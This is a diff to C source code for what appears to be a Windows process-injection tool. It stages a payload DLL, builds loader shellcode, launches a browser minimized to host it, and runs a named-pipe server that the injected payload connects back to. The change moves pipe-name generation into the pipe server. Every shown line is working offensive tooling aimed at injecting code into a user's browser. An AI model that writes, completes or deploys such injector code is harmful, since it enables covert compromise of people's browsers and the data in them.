@@ -93,13 +93,7 @@ BOOL inject_payload(INJECT_CTX* ctx, PBYTE payload_dll, DWORD payload_size) {
     CloseHandle(hTmp);
     printf("[+] Staged %s\n", ctx->dll_temp_path);
 
-    // Step 2: Generate pipe name before spawning (payload needs to know it)
-    generate_pipe_name(ctx->pipe_name, sizeof(ctx->pipe_name), GetCurrentProcessId());
-
-    // Step 3: Set pipe name as env var so payload DLL can find it
-    SetEnvironmentVariableA(PIPE_NAME_ENV, ctx->pipe_name);
-
-    // Step 4: Build shellcode
+    // Step 2: Build shellcode
     DWORD sc_size;
     PBYTE sc = build_loader_shellcode(ctx->dll_temp_path, &sc_size);
     if (!sc) {
@@ -108,7 +102,7 @@ BOOL inject_payload(INJECT_CTX* ctx, PBYTE payload_dll, DWORD payload_size) {
         return FALSE;
     }
 
-    // Step 5: Launch browser normally — no CREATE_SUSPENDED
+    // Step 3: Launch browser normally — no CREATE_SUSPENDED
     STARTUPINFOA si = { .cb = sizeof(si) };
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_MINIMIZE;
@@ -195,6 +189,9 @@ fail:
 }
 
 BOOL run_pipe_server(INJECT_CTX* ctx) {
+    snprintf(ctx->pipe_name, sizeof(ctx->pipe_name), PIPE_NAME_FMT, (unsigned long)ctx->pid);
+    printf("[*] Waiting for payload connection on %s\n", ctx->pipe_name);
+
     HANDLE hPipe = CreateNamedPipeA(ctx->pipe_name,
         PIPE_ACCESS_DUPLEX,
         PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
